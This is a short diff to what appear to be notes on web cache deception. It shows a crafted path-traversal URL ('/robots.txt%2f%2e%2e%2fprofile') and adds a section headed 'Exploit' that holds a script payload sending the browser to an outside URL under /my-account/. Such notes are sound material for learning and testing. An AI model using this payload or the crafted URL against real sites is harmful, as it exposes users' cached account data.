@@ -187,3 +187,8 @@ Example crafted URL: `/robots.txt%2f%2e%2e%2fprofile`.
 The cache might store sensitive data while treating it as a standard file.
 
 ---
+
+#### **Exploit**
+```
+<script>document.location="https://example.net/my-account/wcd.js"</script>
+```
